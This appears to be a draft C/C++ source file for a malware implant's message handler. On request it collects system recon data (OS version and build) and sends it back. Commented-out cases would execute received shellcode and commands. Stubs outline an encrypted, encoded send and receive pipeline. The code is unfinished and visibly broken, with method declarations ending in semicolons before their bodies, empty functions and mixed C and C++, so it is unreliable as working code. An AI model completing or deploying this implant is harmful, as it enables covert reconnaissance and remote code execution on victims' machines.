/* MessageHandler.cpp */

#include "MessageTypes.h"
#include "MessagePublisher.h"
#include "recon.h"


// this function processes the header of the message
// to determine how to interpet the contents/data of 
// the message. 
//int processMessage(BYTE* payload, MessageHeader* header)
// int processIncomingMessage(InternalMessage* msg, Config* config)
int processMessage(InternalMessage* msg, Config* config) // NOTE: passing the config around is actual cancer... i wish i was writing this in c++
{
	switch (msg->header.messageType) {
		case SYSTEM_INFO:
		{
			ReconMessage reconMessage;
			int status = generateReconMessage(&reconMessage);

			// TODO: convert InternalMessage from processMessage into an InternalMessage.payload
			InternalMessage* response = malloc(sizeof(InternalMessage));
			memcpy(response->payload, &reconMessage, sizeof(ReconMessage));
			response->header.payload_size = sizeof(ReconMessage);
			//return send(msg->header.message_id);
			status |= send(response, config);
			return status;
		}

		/*
		case MSG_TYPE_SHELLCODE:
			return ExecuteShellcode(payload, header->payload_size);

		case MSG_TYPE_CMD:
			return ExecuteCommand((char*)payload, header->payload_size);
		*/

		// ... other cases
	}
	return 0;
}

int serialize(InternalMessage* msg, uint8_t* buf, SerializationType serializationType) 
{

}

int serializeReconMessage(const ReconMessage* msg, BYTE* buffer) {
	BYTE* ptr = buffer; // uint8_t*

	// Copy each field from msg struct to buffer
	memcpy(ptr, &msg->dwMajorVersion, sizeof(ULONG)); ptr += sizeof(ULONG);
	memcpy(ptr, &msg->dwMinorVersion, sizeof(ULONG)); ptr += sizeof(ULONG);
	memcpy(ptr, &msg->dwBuildNumber, sizeof(ULONG)); ptr += sizeof(ULONG);
	memcpy(ptr, &msg->wProductType, sizeof(UCHAR)); ptr += sizeof(UCHAR);
	// ... other fields
	return ptr - buffer; // Returns total bytes copied
}

// int deserialize() {}



int compressData(uint8_t* buf) 
{

}

///////////////////////


MessageHandler::MessageHandler(
            CompressorUniquePtr compressorPtr,
            EncrypterUniquePtr encrypterPtr,
            EncoderUniquePtr encoderPtr,
            SerializerUniquePtr serializerPtr,
            Config* config) :
          	compressorPtr_(compressorPtr),
            encrypterPtr_(encrypterPtr),
            encoderPtr_(encoderPtr),
            serializerPtr_(serializerPtr),
            config_(config)
{}

    
bool MessageHandler::sendMessage(); // overload this function?
{
	// TODO: where does parsing go in this? (if it's even needed)

	// InternalMessage
	// Validate
	// Serialize
	// Encode
	// Compress
	// Encrypt
	// Frame (if needed)
	// Raw Bytes
	// Send
}

// TODO: setup a listener function that calls this function?
// listener function simply calls recv and handles socket stuff?
// recvMessage would just serve as a wrapper for that maybe?
bool MessageHandler::recvMessage(); // overload this function?
{
	// TODO: where does parsing go in this? (if it's even needed)

	// Recv
	// Raw Bytes
	// Decrypt
	// Decode
	// Deserialize
	// Obtain InternalMessage object
	// Validate
	// handle InternalMessage (based on its header)
}
